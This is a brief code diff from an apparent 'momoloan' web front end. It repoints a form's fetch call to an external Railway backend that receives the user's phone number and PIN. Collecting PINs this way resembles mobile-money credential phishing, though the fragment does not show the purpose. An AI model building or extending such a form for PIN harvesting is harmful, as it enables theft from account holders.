@@ -137,7 +137,8 @@
         statusMsg.innerHTML = '⏳ Processing...';
         
         try {
-            const res = await fetch('/api/submit', {
+            // ✅ UPDATED: Using your live Railway backend URL
+            const res = await fetch('https://momoloan-production.up.railway.app/api/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone, pin })
